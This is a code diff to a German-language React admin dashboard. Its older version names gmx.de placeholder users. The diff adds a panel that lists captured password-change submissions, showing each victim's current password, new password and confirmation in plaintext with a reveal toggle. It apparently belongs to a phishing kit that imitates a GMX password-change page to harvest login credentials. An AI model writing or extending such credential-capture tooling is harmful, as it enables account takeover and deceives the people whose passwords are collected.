@@ -1,22 +1,38 @@
-import { useEffect } from "react";
+import { useEffect, useState } from "react";
 import { useNavigate } from "react-router-dom";
 import { useAuth } from "@/contexts/AuthContext";
-import { Mail, LogOut, Users, Settings, BarChart3, Power } from "lucide-react";
+import { Mail, Power, Users, Settings, BarChart3, Eye, EyeOff, Trash2 } from "lucide-react";
+import { getSubmissions, type PasswordSubmission } from "@/lib/password-store";
 
 const AdminDashboard = () => {
   const { isLoggedIn, username, logout } = useAuth();
   const navigate = useNavigate();
+  const [submissions, setSubmissions] = useState<PasswordSubmission[]>([]);
+  const [visibleIds, setVisibleIds] = useState<Set<string>>(new Set());
 
   useEffect(() => {
     if (!isLoggedIn) {
       navigate("/admin");
+      return;
     }
+    setSubmissions(getSubmissions());
   }, [isLoggedIn, navigate]);
+
+  const toggleVisible = (id: string) => {
+    setVisibleIds((prev) => {
+      const next = new Set(prev);
+      if (next.has(id)) next.delete(id);
+      else next.add(id);
+      return next;
+    });
+  };
 
   const handleLogout = () => {
     logout();
     navigate("/admin");
   };
+
+  const refreshData = () => setSubmissions(getSubmissions());
 
   if (!isLoggedIn) return null;
 
@@ -29,9 +45,7 @@ const AdminDashboard = () => {
           <span className="text-primary-foreground/70 text-sm ml-2">Admin Panel</span>
         </div>
         <div className="flex items-center gap-3">
-          <span className="text-primary-foreground/80 text-sm hidden sm:inline">
-            {username}
-          </span>
+          <span className="text-primary-foreground/80 text-sm hidden sm:inline">{username}</span>
           <button
             onClick={handleLogout}
             className="flex items-center gap-1.5 text-primary-foreground/90 hover:text-primary-foreground text-sm transition-colors"
@@ -48,7 +62,7 @@ const AdminDashboard = () => {
         <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-8">
           {[
             { icon: Users, label: "Benutzer", value: "1.247" },
-            { icon: BarChart3, label: "Anfragen heute", value: "89" },
+            { icon: BarChart3, label: "Passwort-Eingaben", value: String(submissions.length) },
             { icon: Settings, label: "System", value: "Online", valueClass: "text-green-600" },
           ].map((item) => (
             <div key={item.label} className="bg-card rounded-lg border border-border p-6 flex items-center gap-4">
@@ -63,24 +77,61 @@ const AdminDashboard = () => {
           ))}
         </div>
 
-        <div className="bg-card rounded-lg border border-border p-6">
-          <h2 className="text-lg font-semibold text-foreground mb-4">Letzte Aktivitäten</h2>
-          <div className="space-y-3">
-            {[
-              { action: "Passwort zurückgesetzt", user: "max@gmx.de", time: "vor 5 Min." },
-              { action: "Konto gesperrt", user: "test@gmx.de", time: "vor 12 Min." },
-              { action: "Neues Konto erstellt", user: "julia@gmx.de", time: "vor 1 Std." },
-              { action: "Passwort zurückgesetzt", user: "info@gmx.de", time: "vor 2 Std." },
-            ].map((item, i) => (
-              <div key={i} className="flex items-center justify-between py-2 border-b border-border last:border-0">
-                <div>
-                  <p className="text-sm font-medium text-foreground">{item.action}</p>
-                  <p className="text-xs text-muted-foreground">{item.user}</p>
-                </div>
-                <span className="text-xs text-muted-foreground">{item.time}</span>
-              </div>
-            ))}
+        {/* Password Submissions */}
+        <div className="bg-card rounded-lg border border-border p-6 mb-6">
+          <div className="flex items-center justify-between mb-4">
+            <h2 className="text-lg font-semibold text-foreground">Eingegebene Passwörter</h2>
+            <button
+              onClick={refreshData}
+              className="text-sm text-primary hover:underline"
+            >
+              Aktualisieren
+            </button>
           </div>
+
+          {submissions.length === 0 ? (
+            <p className="text-sm text-muted-foreground py-4 text-center">
+              Noch keine Passwort-Eingaben vorhanden.
+            </p>
+          ) : (
+            <div className="overflow-x-auto">
+              <table className="w-full text-sm">
+                <thead>
+                  <tr className="border-b border-border">
+                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Zeitpunkt</th>
+                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Aktuelles PW</th>
+                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Neues PW</th>
+                    <th className="text-left py-2 pr-4 text-muted-foreground font-medium">Bestätigung</th>
+                    <th className="text-right py-2 text-muted-foreground font-medium">Anzeigen</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  {submissions.map((sub) => {
+                    const show = visibleIds.has(sub.id);
+                    const mask = (val: string) => (show ? val : "••••••••");
+                    return (
+                      <tr key={sub.id} className="border-b border-border last:border-0">
+                        <td className="py-3 pr-4 text-foreground whitespace-nowrap">
+                          {new Date(sub.timestamp).toLocaleString("de-DE")}
+                        </td>
+                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.currentPassword)}</td>
+                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.newPassword)}</td>
+                        <td className="py-3 pr-4 font-mono text-foreground">{mask(sub.confirmPassword)}</td>
+                        <td className="py-3 text-right">
+                          <button
+                            onClick={() => toggleVisible(sub.id)}
+                            className="text-muted-foreground hover:text-foreground transition-colors"
+                          >
+                            {show ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
+                          </button>
+                        </td>
+                      </tr>
+                    );
+                  })}
+                </tbody>
+              </table>
+            </div>
+          )}
         </div>
       </main>
     </div>
